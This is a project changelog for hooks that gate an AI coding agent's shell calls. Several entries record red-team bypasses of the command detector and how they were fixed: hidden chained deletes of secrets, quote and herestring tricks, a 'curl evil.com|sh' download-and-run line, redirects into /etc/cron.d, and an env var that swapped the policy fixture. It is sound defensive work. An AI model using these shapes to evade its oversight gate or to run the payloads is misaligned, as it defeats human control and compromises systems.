### Added — S5: deny-by-default + hook wiring (SUR-02/03/05/10/11/12/13/14, OPS-02, OPS-03, T11, Milestone #23)
- CRITICAL tier. Ratified plan v3: `docs/plans/S5-phase1-2026-09-06.md`; council ruling (split-budget model, Issue #89 fix): `docs/decisions.md`'s 2026-09-06 "council convened on S5" row.
- **ACTIVATION DEFERRED (2026-09-07, `docs/decisions.md`'s "S5 activation deferred" row):** wiring `PreToolUse` live mid-build demonstrated that POL-05's fail-closed-on-ambiguity rule denies virtually every non-kubectl `Bash` command (only S4's kubectl detector exists; no real allow-policy exists yet — S6). Rather than force that cost onto this repo's own day-to-day sessions before S6 ships an allowlist, the `hooks.PreToolUse` entry itself is **not** wired into `.claude/settings.json` this release — the mechanism below is fully built, unit-tested, and reviewed, but inactive. `SessionStart`/`UserPromptSubmit` stay wired (no equivalent Bash-blocking behavior observed).
- **First live-*capable* wiring of this repo's own shipped kernel (S2)/normalizer registry (S3)/shell detector (S4) to a real Claude Code session, activation pending S6** — 0% exposure to real exposure, honestly, not just in theory. Three new hook entry points, designed for `.claude/settings.json` (see the activation note above for current wiring state):
  - `hooks/pretooluse-kernel-gate.mjs` (`PreToolUse`, matcher `Bash`, `"timeout": 60`): normalizes a live `Bash` call and calls `decide()`; denies on POL-05 (opaque/unresolved) or a configured deny rule; checks `tool_name` itself (criterion 19), fail-closed on any non-`"Bash"` value.
  - `hooks/sessionstart-tool-enum.mjs` (`SessionStart`): SUR-03's real half — classifies the session's approximated tool universe (vendored built-ins ∪ statically-declared MCP server names) and writes a halt-state file on any unclassified tool. Wraps its whole computation in try/catch (criterion 17): an internal exception still writes a `"SUR-03-enumeration-failed"` halt reason, never a silent no-halt.
  - `hooks/userpromptsubmit-halt-relay.mjs` (`UserPromptSubmit`): the real halt point (ADR-0021 gap G5) — reads the halt-state file for the current session, exits 2 (blocks the prompt) on any set reason; fails closed on a malformed or wrong-shaped halt-state file too.
- **`src/policy/tools/mcp-enumeration.ts`** (+ `.test.ts`, canary-secret test): pure, names-only `extractMcpServerNames()` — reads MCP server declarations from `.mcp.json`/`~/.claude.json` shapes without ever touching `env`/`args`/`command` fields (OPS-02, `REQUIREMENTS.md:584`, P0). Council-ruled fix for Issue #89 (reading `~/.claude.json` WIDENS the read surface unless names-only-extracted, CONTAINS once it is).
- **`src/policy/config/bootstrap-ruleset.ts`**: `loadBootstrapRuleSet(): RuleSet` (criterion 21) — an explicit, disclosed placeholder (empty rules, `defaultOutcome: "allow"`) pending S6's real central-policy loader; not a §0.4-compliance claim. `defaultOutcome`'s value resolved explicitly (see the file's own header) — matches this repo's pre-existing kernel/registry test-fixture convention, and POL-05's own unconditional ambiguity-deny stays the real "deny-by-default" mechanism regardless of this value.
- **`src/policy/tools/builtin-tool-inventory.ts`** + **`docs/qa/tool-inventory.json`**: the real, vendored "shipped defaults" tool-classification catalog for Claude Code's own built-in tools (19 tools), doubling as SUR-05's vendored built-in-tool snapshot.
- **`src/qa/gate-command-path-check.ts`** (`qa:gate-command-path`, SUR-13 precondition / Issue #87's fix precondition): structural CI check — every `.claude/settings.json` `type: "command"` hook entry's script path must resolve to a real file on disk. Confirmed RED against the pre-existing broken `hooks/report-subject-gate.mjs` entry before any other S5 file was written.
- **`src/qa/gate-matcher-drift-check.ts`** (`qa:gate-matcher-drift`, SUR-05): fails if a tool name referenced by the classification catalog or a `.claude/settings.json` hook matcher is absent from the vendored built-in-tool snapshot. Explicitly, permanently one-directional (disclosed in its own printed output every run) — never catches a new upstream tool nobody has referenced yet.
- **`src/qa/gate-manifest-check.ts`** (`qa:gate-manifest`, SUR-13): exactly one file in the repo may define a top-level `hooks` key; fails on zero or two-or-more.
- **`src/qa/gate-latency-budget-check.ts`** (`qa:gate-latency-budget`, OPS-03, council's split-budget model): a SEPARATE, measured, CI-regression-tested latency budget (declared ceiling 2000ms, spike doc `docs/spikes/T11-ops03-latency-budget-2026-09-06.md`) — an overrun is a CI-10 incident, never a change to the `PreToolUse` entry's own fixed, disclosed `"timeout": 60` (SUR-12). The two numbers are never derived from each other.
- **`src/policy/tools/subagent-non-escalation.test.ts`** (SUR-14, fixture-only, filed at `src/policy/tools/` per architecture-reviewer's council-seat condition): a delegated/child session's tool grant is never a superset of its parent's.
- **`.claude/settings.json`**: the fictional `hooks/report-subject-gate.mjs` `PreToolUse` entry and its header-comment claims (a hash-chained audit log that never existed on this branch, Issue #87) are REMOVED, not replaced or rebuilt — the real audit-trail mechanism is S8/Milestone #26/INT-05's job. Replaced with an honest disclosure paragraph naming the split-budget model and the three new hook entries.
- `CLAUDE.md`: `.thoth/halt-state/` added to the "Sensitive areas" list (criterion 24). `.gitignore`: `.thoth/halt-state/` (session-generated runtime state, not source).
- Zero diff to `src/policy/kernel/**`, `src/policy/normalizer/action-catalog.ts`, `src/policy/normalizer/target-format.ts`, `src/policy/normalizer/registry.ts`, `src/policy/normalizer/shell*.ts` — this story only calls into them.
- **Operational finding, disclosed (see `docs/backlog.md`):** the shipped shell normalizer only recognizes a kubectl-shaped grammar — now that it is live for the first time, it denies (via POL-05's unconditional ambiguity rule) virtually every non-kubectl-shaped `Bash` call, not only chained ones. This is the disclosed, ratified "deny-by-default" posture (no real allow-policy exists yet, S6), but it also means an ordinary development session in THIS repo, once this hook is active, cannot run most everyday commands (`npm test`, `git status`, etc.) through the gated `Bash` tool until S6 ships real allow rules.

### Fixed — S5 Stage-3 CRITICAL review round 1 fix-now (`red-team` no-go, `app-security-reviewer`/`cross-domain-reviewer` REWORK, 2026-09-07; human-ruled disposition: `docs/decisions.md`'s 2026-09-07 "S5 Stage-3 CRITICAL review round 1" row)
- **[HIGH → ratified interim exemption, GH Issues #90/#92]** `KNOWN_CONNECTORS` and `centralLayer` are no longer hardcoded in `hooks/sessionstart-tool-enum.mjs` — both allowlists now load at runtime from ONE new committed, dated, separately-reviewable fixture, **`docs/qa/s5-central-classification.json`** (via new pure loader `src/policy/tools/central-classification.ts`), carrying `version`/`expiresOn` (2026-10-07)/`ratifiedBy`. **Expiry is enforced at runtime, not only in CI**: past `expiresOn`, both exemptions stop being applied automatically — every fixture-classified MCP server reverts to unclassified, every allowlisted connector reverts to unknown — never silently rolled forward. `KNOWN_CONNECTORS`'s own disclosure (now in `central-classification.ts`'s header) states plainly: this is a pure display-name string match, spoofable in principle, NOT a real security control, ships only because the human explicitly ratified it as a known, dated residual risk. Pinned by a dedicated regression test per allowlist (`central-classification.test.ts`), closing GitHub Issue #98 (both allowlists were previously invisible to every test/QA gate in the repo) as a structural byproduct.
- **[MED, GH Issue #91]** The false "S6/T5's real central-override loader" stopgap-framing comment (T5 already shipped in S3; no milestone currently owns a real central-override config loader, confirmed against every open milestone's `gh` description) is corrected in `hooks/sessionstart-tool-enum.mjs`, `src/policy/tools/builtin-tool-inventory.ts`, and the new fixture's own `notes` field.
- **[HIGH, GH Issue #94]** Every `blockWithMessage()` active-reason message in `hooks/userpromptsubmit-halt-relay.mjs` now names a concrete, actionable unlock per reason key (PRINCIPLES.md rule 2) — e.g. which fixture field to edit, or to resume the session. Paired with the new AC5 reconciliation below, a halted session is no longer permanently bricked with no stated escape (red-team's F5 finding).
- **[MED, GH Issue #94 (reconciliation half)]** `hooks/sessionstart-tool-enum.mjs`'s three SUR-03-owned halt reason keys (`SUR-03-unclassified-tool`, `SUR-03-unclassified-connector`, `SUR-03-enumeration-failed`) are now explicitly reconciled to `set:false` on the SessionStart run after their condition no longer holds — SessionStart genuinely re-runs on a resumed session, so a fixed condition now un-halts automatically. A condition that was never active is never fabricated into the halt-state file (a vanilla, fully-classified session still writes no file at all — `test-writer`'s own AC-4 contract, unmodified).
- **[HIGH, GH Issue #95]** `hooks/userpromptsubmit-halt-relay.mjs`'s halt-state shape validation (`inspectHaltState`) now validates the FULL schema, not just the top level — closes the previously fail-open malformed shapes red-team's F6 table demonstrated (missing `reasons` key, `reasons` as a string, `set:"true"`, `set:1`), each now failing CLOSED (block).
- **[MED, GH Issue #97]** Third-party-controlled `detail` text (MCP server / connector names) is length-capped (200 chars, explicit `...[truncated]` marker) and control-character-stripped (`sanitizeDetail`) before reaching the chat-visible `systemMessage`, closing the injection-widening channel this diff's own `describeActiveReasons` had opened.
- **[GH Issue #93, comment-only]** `centralLayer.tools[].class` is now explicitly disclosed as inert (no consumer reads it; `red-team` demonstrated mutating an entry's class to `read-only` left the full suite green) in `central-classification.ts`'s and `builtin-tool-inventory.ts`'s own headers and the fixture's own `notes` field. Building a real consumer is S6's job, tracked at `docs/backlog.md`, not built here.
- **[GH Issue #96, deliberately deferred, not fixed this pass]** Pre-existing `unknown-session.json` fail-open (malformed SessionStart stdin routes its halt reason to the wrong file) — ruled defer, spike-first, per PRINCIPLES rule 18 (no fix on an unmeasured fact). Tracked at `docs/backlog.md` and as a same-turn comment on GH Issue #96.
- New: `docs/qa/s5-central-classification.json`, `src/policy/tools/central-classification.ts` (+ `.test.ts`), `hooks/sessionstart-tool-enum-fixnow.test.ts`, `hooks/userpromptsubmit-halt-relay-fixnow.test.ts` (both new sibling files — `test-writer`'s own two hook test files are unmodified).
- Zero diff outside `hooks/sessionstart-tool-enum.mjs`, `hooks/userpromptsubmit-halt-relay.mjs`, `src/policy/tools/central-classification.ts`(+test), `src/policy/tools/builtin-tool-inventory.ts` (header comment only), the two new fixnow test files, the new fixture, `docs/backlog.md`, and this entry.

### Fixed — S5 fix-now round 2 re-confirm found a new regression; `/maat:council` convened (rule 16(c), 2 consecutive non-clean Stage-3 rounds); round 3 is the council-ratified fix (`docs/decisions.md`'s 2026-09-07 council rows; council reports: `docs/reviews/s5-fixture-mechanism-design-challenger-stopbrief-2026-09-07.md`, `s5-central-classification-architecture-council-2026-09-07.md`, `s5-fixnow-council-impact-analyst-2026-09-07.md`; verdict GO on Path A, targeted mechanical patch)
Round 1's fix-now (above) moved `KNOWN_CONNECTORS`/`centralLayer` into a committed, dated fixture. Round 2's re-confirm found the fix itself introduced a NEW, worse HIGH — `red-team`'s report: `docs/reviews/s5-fixnow-round2-red-team-2026-09-07.md`.
- **[HIGH → FIXED, GH Issue #99]** `THOTH_S5_CENTRAL_CLASSIFICATION_FIXTURE_PATH`, an ambient env var the production code path honored unconditionally to locate the fixture, let the ENTIRE fixture (both allowlists AND `expiresOn`) be silently replaced — deliverable via a globally-gitignored `.claude/settings.local.json`, invisible to `git status`/every test/`qa:gate-manifest`, with the resolved path recorded nowhere. `architecture-reviewer`'s council-seat ruling: a category error, not a hardenable bug — `REQUIREMENTS.md:70` (§0.4 property 2) requires the policy source be reachable by no credential the governed session holds, violated by construction the moment a session-writable settings file can steer which fixture a fail-closed gate trusts. **Fix, per the architect's exact ruling:** the env var is removed entirely (no environment variable of any kind decides which fixture the production code path loads); it now resolves via the same `CLAUDE_PROJECT_DIR`-relative seam already governing every other input this hook reads (`.claude/settings.json`, `.mcp.json`), with a module-adjacent (`import.meta.url`-relative, env-immune) fallback to the committed copy. Test injection of a synthetic/expired fixture now goes through `hooks/test-support/fixture-tree.ts`'s new `writeCentralClassificationFixture()`, writing into the already-isolated `CLAUDE_PROJECT_DIR` temp tree — the same accepted test-isolation idiom this codebase already uses, not a new ambient signal. **Boundary-crossing per `design-challenger`'s council carve-out** (bypasses a security boundary regardless of its MED reach/likelihood calibration): mandatory RED-before/GREEN-after proof-test, not just asserted fixed.
- **[MED → FIXED, GH Issue #100]** `expiresOn`'s VALUE (not just its shape/type) was unpinned by any test — rolling it from the ratified `2026-10-07` to `2099-01-01` left the full suite and all four QA gates green, defeating the forced-renewal property the human's ratification depends on. New exact-value pinning test (`central-classification.test.ts`) fails on any value other than `2026-10-07`. Boundary-crossing; mandatory RED-before/GREEN-after proof-test.
- **[MED → FIXED, GH Issue #101]** Past `expiresOn`, `blockWithMessage`'s `UNLOCK_HINTS` named an unlock that didn't actually unlock anything (following its instruction literally still exited 2). Expiry is now its own distinctly-named, reconciled halt cause (`SUR-03-central-fixture-expired`) with its own accurate unlock hint (re-ratify with a fresh `expiresOn`, or remove the exemption) — following the new hint literally now genuinely reconciles and exits 0.
- **[MED → FIXED, `app-security-reviewer` round-2 escalation of GH Issue #96]** AC5's `set:false` reconciliation could clear a DIFFERENT session's genuinely-active halt reason via the shared `unknown-session` fallback bucket — a fail-open direction. `reconcileReason` now unconditionally skips the fallback bucket; only a real, resolved, host-supplied `session_id`'s own file is ever reconciled. Relocates this back to its pre-round-2 safe-stuck direction (per app-security/impact-analyst's agreed disposition). Boundary-crossing; mandatory RED-before/GREEN-after proof-test. **GH Issue #96 itself** (the original, pre-existing `unknown-session.json` malformed-stdin fail-open) stays open, unregressed, deliberately deferred — this fix addresses only the NEW escalation, not the underlying gap.
- Not fixed this round, correctly left open per council scope: the Unicode/bidi `sanitizeDetail` gap (`red-team`/`app-security-reviewer` round-2, non-boundary-crossing) — tracked at `docs/backlog.md` and GH Issue #97. A new, non-blocking `UNPROVEN-pending-verification` suspicion surfaced by `red-team`'s round-3 re-confirm (`docs/reviews/s5-fixnow-round3-red-team-2026-09-07.md`) — whether a live session's own `CLAUDE_PROJECT_DIR` could itself be overridden via a real `env` settings block, reaching the same class of issue one layer deeper — is tracked at `docs/backlog.md` as a human drill, not a code defect.
- Round 3 verification (real counts): `npm test` 547/547 pass, 0 fail, 0 skipped; `npm run typecheck`/`npm run lint` clean; all four `qa:gate-*` scripts PASS. Re-confirmed independently by `red-team` (go), `app-security-reviewer` (APPROVE), `cross-domain-reviewer` (APPROVE-WITH-CONDITIONS — this round closes the rule-16(c) stall) — each re-ran its own repros against the fixed code rather than trusting the build receipt.
- New: `hooks/sessionstart-tool-enum-fixnow.test.ts`/`src/policy/tools/central-classification.test.ts` gained the round-2/round-3 regression + proof-tests above; `hooks/test-support/fixture-tree.ts` gained `writeCentralClassificationFixture()`. `test-writer`'s two original hook test files remain byte-unchanged throughout (verified by hash, not just diff, in round 3's re-confirm).
- **Post-round-3 gap closed: the "record the resolved fixture path" condition both council reports attached to their verdicts was never actually implemented.** `impact-analyst`'s and `architecture-reviewer`'s council reports (`docs/reviews/s5-fixnow-council-impact-analyst-2026-09-07.md`, `docs/reviews/s5-central-classification-architecture-council-2026-09-07.md`) both conditioned their SAFE-TO-PATCH/APPROVE-WITH-CONDITIONS verdicts on "record the resolved fixture path in halt-state, so a non-default load is never silent" — red-team's own stated prerequisite (`docs/reviews/s5-fixnow-round2-red-team-2026-09-07.md`) for the `expiresOn` pin to mean anything. `hooks/sessionstart-tool-enum.mjs`'s new `resolveFixtureLocation()` resolves, once per run (before stdin is even read, so it survives an enumeration exception too), which of the two fixture paths (project-relative primary vs. the module-adjacent `DEFAULT_FIXTURE_PATH` fallback — now exported from `src/policy/tools/central-classification.ts`) this run will load, and `writeHaltReason` stamps `fixtureSource`/`fixturePath` at the halt-state file's top level, additively, alongside `reasons`, whenever a halt-state file is already being written for some other, genuine reason. Scoped explicitly by AC-4 (unmodified): a vanilla, fully-classified session that never writes a halt-state file at all still writes none — the resolved-path record is never itself the reason a file gets created. Verified directly (not assumed) that `hooks/userpromptsubmit-halt-relay.mjs`'s `inspectHaltState` tolerates the new top-level fields additively at both the code-trace level and by running the relay against a live halt-state file carrying them (both a clean and an active-reason case) — no change needed there. New regression tests (`hooks/sessionstart-tool-enum-fixnow.test.ts`): the project-relative case, the fallback-default case, and an explicit AC-4-unregressed check.

### Added — S4: shell-command semantic detector (SUR-06, SUR-07, SUR-08, SUR-09, QA-06's first real exercise)
- CRITICAL tier (Milestone #22, "historically highest-incident component"). Ratified scope: `docs/decisions.md`'s 2026-09-02 S4-intake row + the 2026-09-02 "design-challenger's pre-build attack" row (round 1, verdict `go`, report `docs/reviews/s4-shell-semantic-detector-design-challenger-2026-09-02.md`).
- `src/policy/normalizer/shell-scanner.ts` (+ `.test.ts`): new quote/heredoc-aware raw-text primitives, no `ActionRecord` knowledge — `quoteStates` (per-character single/double-quote tracking), `findLiveChainOperator`/`hasLiveChainOperator` (SUR-06a), `findLiveSubstitution`/`hasLiveSubstitution` (design-challenger Finding #1), `stripHeredocBodies` (SUR-08 — a heredoc marker's own line, including a trailing redirect, is preserved byte-for-byte; only the body between marker and terminator is removed), `extractRedirectTarget`, `tokenize` (quote-aware, SUR-06b/07), `normalizeToolToken` (path-qualification stripping).
- `src/policy/normalizer/flag-catalog.ts` (+ `.test.ts`): `resolveFlagAlias` (SUR-07's flag-abbreviation criterion — one entry, `-c` → `context`, equals-form only) and `matchDirectoryFlagToken` (design-challenger Finding #2 — `-C`/`-d`/`--directory` reported via `unresolved`, never silently invisible; no path-resolution logic, presence-only per the ruled fix).
- `src/policy/normalizer/wrapper-catalog.ts` (+ `.test.ts`): the 9 named SUR-09 deferred/indirect-execution wrappers (`bash`/`sh -c`, `eval`, `exec`, `nohup ... &`, `source`/`.`, `env`, `xargs`, `at`, `crontab`) as a data table, not an if/else ladder (ADR-0003). Each recognized wrapper's inner command is extracted (or reported as "not statically extractable" — `source`/`.`/`crontab`/bare `at`, whose content lives outside the invocation line, always resolve this way by design, never a false clean pass). A binary name that matches but whose sub-shape doesn't (`bash -x`, bare `nohup`, `eval` with nothing following, `env`/`xargs` with their own out-of-scope flags) reports `"unresolved-shaped"`, never silently passed through as a benign unrecognized verb (criterion 10). Deliberately NOT covered, flagged plainly in the file's own header so it's never mistaken for coverage: `sudo`/`su -c`/`doas`, generic interpreter-inline-exec (`python -c`/`perl -e`/etc.) — design-challenger Finding #4, tracked in `docs/backlog.md`.
- `src/policy/normalizer/shell.ts` (rewritten, composing over the three modules above): chain-operator/substitution/directory-flag checks first (fail-closed, unconditional); then wrapper detection with bounded recursion (`normalizeShellCall` calls itself on a wrapper's extracted inner command, depth-capped at 5 — a designed safety bound, not a measured figure, justified in the file's own header comment; at-cap resolves via `unresolved`, consistent with every other ambiguity in this component); then the existing S3 kubectl-shaped grammar, generalized to be order-independent over flags (SUR-07 reordering) with additive redirect-target extraction (SUR-08). Zero diff to `kernel.ts`, `action-catalog.ts`, `target-format.ts`, `registry.ts` (ADR-0006's no-opportunistic-scope-widening clause; `docs/decisions.md`'s 2026-09-02 ruling reuses S2's POL-05 fail-closed-on-`unresolved` mechanism rather than new kernel dispatch shape).
- `src/policy/fixtures/normalizer-calls.ts`: 17 new S4 fixture calls (chaining, quote-preserved chaining, reordered/abbreviated/path-qualified/quoted differential pairs, directory-flag long/short forms, command/backtick substitution, heredoc+redirect, kubectl+redirect additive case, each named wrapper, unrecognized-wrapper-shape, depth-cap exact/exceeded, inner-unresolved propagation).
- `src/qa/shell-detector-mutants.ts`: QA-06's first real exercise — named mutant classes (one per meaningfully distinct decision branch identified while reading the shipped diff — a manually-curated, not AST-derived, enumeration; see the file's own header comment and the Stage-3 review fix-now entry below for why that distinction is stated explicitly) registered against S4's own regression suite via the S1-shipped `mutation-harness.ts` engine (disclosure-text only edit, no logic change). Runs against a scoped shadow copy (`src/policy/**` + a minimal `package.json`), not the whole repo, for speed. All KILLED, non-vacuous: `[[completeness: cmd="qa-mutation-shell" expect=53]]` (count current as of round 3's re-confirm fix (Issue #83), below — kept in sync with the live instrument rather than pinned to this section's own original count). `package.json`'s `qa:mutation-shell` script (new `completeness-claim-checker.ts` allowlist entry for this marker) + a new `.github/workflows/ci.yml` step.
- `src/qa/mutation-harness.ts`: the "0 real mutant classes... S2+ builds that" disclosure text was accurate at S1 but stale now that S4 registered real ones (in a separate script, by design — the engine stays generic). Reworded to point at `shell-detector-mutants.ts` instead of claiming no detector exists; no logic changed, `mutation-harness.test.ts`'s existing regex-based assertion on this text still passes unmodified.
- `src/policy/normalizer/registry.test.ts`: 3 new end-to-end tests proving the kernel (unchanged) denies via POL-05 for a chained command, a command-substitution call, and a directory-flag call — the "kernel denies" bar SUR-06/design-challenger's findings require, not just normalizer-level `unresolved`.
- Two real bugs found and fixed during this story's own build (not by a reviewer — caught by this story's own sanity-checking against the design-challenger's proof-test guidance before the formal test suite was written):
  - `resolveKubectlShape`'s "was this even a kubectl-grammar attempt" check originally tested the RAW `resourceToken` (which a bare redirect target like `/target` satisfies, since it contains "/") instead of the PARSED `resource` — a genuine redirect/write-only command (SUR-08's own named heredoc+redirect test) was wrongly routed into the "kubectl attempted but incomplete" fallback, reporting spurious `unresolved` messages instead of a clean write record. Fixed to check the parsed `resource`; regression-guarded by its own named mutant (`kubectl-attempted-uses-raw-resource-token-regression`).
  - `findLiveChainOperator`/`findLiveSubstitution` each had a redundant outer quote-liveness guard duplicating the (correct, complete) per-character check already inside their inner loop — the mutation harness caught this directly: mutating the outer guard away survived, because the inner check already covered every case. Simplified to the single inner check (one source of truth) rather than keep dead-but-passing redundancy.
- Depth cap (5) and its at-cap fail-closed behavior stated and justified in `shell.ts`'s own header comment, per the unsourced-number rule (PRINCIPLES rule 18) — a designed safety bound, not a measured operational figure; design-challenger Finding #6 (SURVIVES on safety, LOW/UNPROVEN on precision) tracked as a residual in `docs/backlog.md`.

### Fixed — S4 Stage-3 review fix-now round (`red-team` no-go, `app-security-reviewer` REWORK, `cross-domain-reviewer` REWORK, `architecture-reviewer` APPROVE-WITH-CONDITIONS, 2026-09-02/03)
Reports: `docs/reviews/s4-shell-semantic-detector-{red-team,app-security,cross-domain,architecture}-2026-09-02.md`. Cross-domain's own finding (a bare completeness claim in `docs/decisions.md` prose) was fixed by the Manager directly (Issue #79) and is not repeated here. All nine remaining findings below share one root assumption red-team's report names directly: "a shell command is one command." Every fix below is a case where that assumption was silently false.

- **[HIGH, Issue #70, red-team]** `CHAIN_OPERATORS` (`&&`, `||`, `;`, `|`) omitted a bare newline and a bare (non-doubled) `&` — both start a genuinely separate command in real bash with no special syntax at all. `kubectl get pods/api --context=prod\nkubectl delete secrets/db-creds --context=prod` clean-resolved as get-only; same for `& `-separated, and reachable through `at`'s heredoc body. Fixed: new `findLiveTrailingSensitiveSeparator` (`shell-scanner.ts`) flags a live newline or non-doubled `&` that has more live content after it — a bare TRAILING `&` (nohup's own background marker) and a bare trailing newline stay exempt, since neither hides a second command.
- **[HIGH, Issue #71, red-team]** A `<<<` herestring was mis-matched as a heredoc marker (`findLiveHeredocMarker`'s regex matched two of the three `<` characters), swallowing every following line as inert body before any chain check ran. Fixed: the marker regex now requires a lookbehind AND lookahead — exactly two consecutive `<` characters, never three or more.
- **[HIGH, Issues #72/#69, red-team + app-security]** The directory-flag guard (design-challenger's mandated fix) recognized only `--directory=<v>` and bare `-C`/`-d`; `--directory <v>`, `-d=<v>`, and `-C=<v>` all slipped through. Worse: `-C=<v>` also fell through to the generic short-flag path, where `resolveFlagAlias`'s lowercasing resolved it to the SAME canonical name `-c=` aliases to (`context`) — a directory flag could silently supply the cluster field. Fixed: `matchDirectoryFlagToken` now covers every ordinary spelling of the flag; because it is checked before the generic alias branch, the alias-collision closes as a direct consequence, not a second patch.
- **[HIGH, Issue #73, red-team]** Only the first resource-shaped positional token was extracted (`positional.find`, not `filter`) — `kubectl delete pods/api secrets/db-creds --context=prod` reported `pods/api` only while a real shell deletes both. Same shape reachable through `xargs`, whose entire purpose (appending arguments read from stdin at runtime) is invisible to any static parse. Fixed: `collectResources` collects EVERY resource-shaped token (any parse failure among them denies the whole call, never a partial accept); `xargs`'s `extractInner` now always returns `undefined` — every xargs invocation resolves to `unresolved`, honestly, rather than resolving only its visible (and always incomplete) prefix.
- **[HIGH, Issue #68, app-security — "the sharpest one"]** An unterminated single quote made the `quoteStates` walker treat everything from the open quote to end-of-string as permanently inert, disabling chain-operator detection AND design-challenger's command-substitution detection at once: `kubectl get pod/foo --context='prod $(curl evil.com|sh)` resolved clean. Fixed: `quoteStates`/`hasUnterminatedQuote` are now both thin wrappers over one shared `walkQuoteState` walk exposing the walk's FINAL state (not just the per-character array — a quote closed by the very last character of the string looks identical to an unterminated one in the per-character array alone, a follow-up bug this file's own regression test caught before it shipped). `collectSyntaxUnresolved` checks this FIRST, ahead of every other syntax check.
- **[MED, Issue #74, red-team]** Only the first live redirect target was extracted — `cat p > /tmp/ok > /etc/cron.d/pwn` reported `/tmp/ok` only while bash opens and truncates both, with stdout landing on the last. Fixed: `extractRedirectTargets` (renamed, plural) collects every live match.
- **[MED, Issues #75/#78, red-team + architecture — duplicate finding, one fix]** `shell-detector-mutants.ts`'s byte-literal multi-line anchors crashed uncaught on a CRLF-checked-out working tree (this repo had no `.gitattributes`; a Windows `core.autocrlf=true` checkout converts previously-tracked files to CRLF while brand-new untracked files stay LF). Confirmed dormant in real CI (ubuntu-latest, LF) but a real local dev-platform hazard. Fixed both ways, per both reports' "either sufficient alone": `textMutant` now normalizes CRLF→LF on both the source and the anchor/replacement before comparing; new `.gitattributes` (`* text=auto eol=lf` plus explicit source-extension rules) prevents the drift at its source for every future file, not just this one mechanism.
- **[MED, Issue #76, red-team]** `shell-detector-mutants.ts`'s own header comment claimed its mutant list was "derived from the real, shipped code... not hand-counted" — the anchor-throw mechanism only proves each LISTED mutant still points at live code, a strictly weaker property than "one mutant per branch"; nothing mechanically enumerates the branch set. Fixed: header reworded to state plainly that the list is manually curated, not AST-derived, with a `docs/backlog.md` line for the durable (AST-derived, branch-complete) instrument as future work. The list itself also grew from 28 to 40 mutants — 3 anchors updated for this round's own code changes, 9 new mutants for the newly-added logic (trailing-sensitive separators ×3, herestring exclusion, unterminated-quote check ×2, widened directory-flag shapes ×2, multi-resource collection, xargs inner-extraction, multi-redirect collection), plus 2 regression guards for bugs this fix-now round found in its own new code (below) — each one independently KILLED (see the verification line at the end of this entry for the run).
- **[MED, Issue #77, architecture]** `normalizeShellCall`'s recursion-depth parameter was public and externally-callable on the same exported symbol registry.ts calls at depth 0 — not live-exploitable (0 external call sites pass a non-default depth) but a structural way to bypass the depth cap in this codebase's first recursive-dispatch normalizer. Fixed: split into an unexported `normalizeAtDepth(raw, depth)` (the only recursive self-call site) and the public `normalizeShellCall(raw)`, which always starts at depth 0 — no caller outside the module can ever supply `depth`; TypeScript's own module boundary is the regression test.
- **Two real bugs this fix-now round found in its own new code, neither from a reviewer report, both regression-guarded by a named mutant:**
  - The multi-resource fix (Issue #73) initially reintroduced the SAME "raw token vs. parsed result" bug this story fixed once already (see the original `Added — S4` entry below): a redirect target like `/etc/app/config` trivially "contains a slash" and was wrongly collected as a malformed resource candidate, poisoning an otherwise-valid resource elsewhere in the same command via the shared `resourceMalformed` flag. Root-fixed at the tokenizer level: `scanFlags` now excludes a live redirect operator (`>`/`>>`) and its target token from `positional` entirely, so a redirect target can never reach resource-candidate collection at all — `kubectlAttempted` could then safely revert to checking the raw `resourceTokens` count (catching a malformed NON-redirect resource token that coexists with a redirect, which the parsed-only check had silently dropped into a false-clean write record).
  - The depth-cap fixtures' hand-escaped nested `eval "..."` quoting (6 levels of `replaceAll('"', '\\"')`) did not correctly re-escape for multi-level nesting and tripped the new `hasUnterminatedQuote` check at deeper levels. Rebuilt using repeated `exec` wrapping instead — `exec`'s inner-extraction needs no quoting at all, so nesting composes unambiguously to any depth.
- **Residuals carried to `docs/backlog.md`, not fixed in this pass** (both explicitly non-blocking per their own reports): red-team's suspicion #8 (a pre-existing `docs/STATE.md`/`docs/decisions.md` QA-15 gap predating S4, tracked separately) and suspicion #9 (SUR-10's fail-open register doesn't exist yet — a later milestone's artifact); architecture's suspicion #4 (whether recursive-dispatch is a sanctioned template for future stories — advisory).
- Verification: `npm test` 377 total, 0 fail, 0 skipped (41 more than the original S4 build's 336); `npm run typecheck`/`npm run lint` clean; `npm run qa:mutation-shell` 40/40 KILLED, non-vacuous; `npm run qa:kernel-purity`/`qa:normalizer-registry-purity` PASS, zero diff to `kernel.ts`/`action-catalog.ts`/`target-format.ts`/`registry.ts` confirmed via `git diff --stat`.

### Fixed — S4 round 4 re-confirm follow-up, Issue #84 fix-now (day-1 S5-blocking task, human-ruled Option B, `docs/decisions.md` 2026-09-06 row)
`red-team` round 4's re-confirm found ONE new defect in round 3's own #81 fd-dup fix (a genuinely different branch than #83's escape-liveness bug, disclosed by red-team as its own round-3 miss, not a round-4 regression). This tripped PRINCIPLES rule 16's second-stall hard stop — no second council convened; the human ruled **Option B**: ship S4 with Issue #84 open, filed as a day-1 blocking precondition on S5 (Milestone #23). Closed here, before any S5 build work, per that ruling's own instruction.

- **[HIGH, Issue #84, red-team round-4]** `findLiveRedirectMatches`'s Issue #81 fd-dup exclusion skipped ANY `>` immediately followed by `&` unconditionally — but bash only treats `>&DIGIT`/`>&-` as fd-dup (no file created); `>&WORD` (spaced or glued, e.g. `>& out`/`>&out`) is the historical synonym for `&>WORD`, a REAL file redirect (both streams to a real file). `kubectl get pods/api --context=prod >& out` clean-resolved as a read (`extractRedirectTargets() == []`) while real bash creates and writes `out` — the un-ampersanded control (`> out`) correctly denies via the Issue #82 assembled-target-count guard, so one appended `&` flipped deny to allow. Fixed, per the human's own named fix (declining Option C's broader redirect-classification-grammar rewrite): the skip is now conditional on the character immediately following the `&` being a digit or `-`, mirroring the existing `precededByLiveAmpersand` (`&>`) adjacency check already in the same function. A `>&WORD` match now extends `length` by 1 (skipping past the `&` itself, not just the `>`) so target extraction and the position-based token exclusion both start at the real word, not at `&word`.
  - Checked for recurrence of the round-3/3.5-consolidated raw-character-adjacency pattern (`isLiveGreaterThan`/`escapedChars`, Issue #83): grepped the full `src/policy/normalizer/` tree for the `=== "&"` shape — the only other hits are `isSingleAmpersand`'s own already-fixed `isLiveGreaterThan` calls (line 194, unrelated defect class) and `wrapper-catalog.ts`'s trailing-background-marker check (a different question — "does this token list end in a background `&`" — not redirect-target classification). Issue #84's defect is a digit-vs-word classification question, not a quote/escape-liveness question `isLiveGreaterThan`/`escapedChars` answer, so it is NOT an instance of that same helper's concern and does not extend it — confirmed by an actual grep, not asserted.
